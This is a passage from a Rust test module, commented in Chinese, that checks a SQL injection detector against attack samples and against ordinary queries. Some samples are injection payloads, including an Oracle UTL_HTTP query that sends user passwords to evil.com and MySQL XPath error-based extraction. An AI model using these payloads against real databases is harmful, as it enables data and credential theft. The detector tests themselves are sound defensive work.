        assert!(contains_sql_injection("SELECT * FROM users ORDER BY 1#"));
        // PROCEDURE ANALYSE (MySQL)
        assert!(contains_sql_injection("SELECT * FROM users PROCEDURE ANALYSE()"));
        // EXTRACTVALUE (MySQL XPath 注入)
        assert!(contains_sql_injection(
            "SELECT EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))"
        ));
        // UPDATEXML (MySQL XPath 注入)
        assert!(contains_sql_injection(
            "SELECT UPDATEXML(1, CONCAT(0x7e, (SELECT version())), 1)"
        ));
        // XMLTYPE (Oracle)
        assert!(contains_sql_injection(
            "SELECT XMLTYPE('<x>' || (SELECT password FROM users) || '</x>') FROM dual"
        ));
        // UTL_HTTP (Oracle 网络请求)
        assert!(contains_sql_injection(
            "SELECT UTL_HTTP.REQUEST('http://evil.com/' || password) FROM users"
        ));
        // UTL_INADDR (Oracle DNS 注入)
        assert!(contains_sql_injection(
            "SELECT UTL_INADDR.GET_HOST_ADDRESS('evil.com') FROM dual"
        ));
        assert!(contains_sql_injection(
            "SELECT UTL_INADDR.GET_HOST_NAME('192.168.1.1') FROM dual"
        ));
    }

    /// 测试正常 SQL 不被误报
    #[test]
    fn test_sql_injection_false_positives() {
        // 正常的 SELECT 语句不应被检测为注入
        assert!(!contains_sql_injection("SELECT id, name FROM users WHERE id = 1"));
        assert!(!contains_sql_injection("SELECT * FROM products WHERE price > 100"));
        assert!(!contains_sql_injection(
            "INSERT INTO users (name, email) VALUES ('test', 'test@example.com')"
        ));
        assert!(!contains_sql_injection(
            "UPDATE users SET name = 'new_name' WHERE id = 1"
        ));
        assert!(!contains_sql_injection("DELETE FROM users WHERE id = 1"));
        // 正常的 JOIN 操作
        assert!(!contains_sql_injection(
            "SELECT u.name, o.order_id FROM users u JOIN orders o ON u.id = o.user_id"
        ));
        // 正常的子查询
        assert!(!contains_sql_injection(
            "SELECT * FROM users WHERE id IN (SELECT user_id FROM orders)"
        ));
    }

    /// 测试字符串字面量中的注入模式不会被误报
    #[test]
    fn test_sql_injection_in_string_literals() {
        // 字符串中的注入模式不应触发检测（因为字符串被移除）
        // 注意：这取决于 remove_string_literals 的实现
        assert!(!contains_sql_injection(
            "SELECT * FROM users WHERE name = 'test OR 1=1'"
        ));
        assert!(!contains_sql_injection(
            "SELECT * FROM users WHERE comment = 'This is -- a comment'"
        ));
    }
}
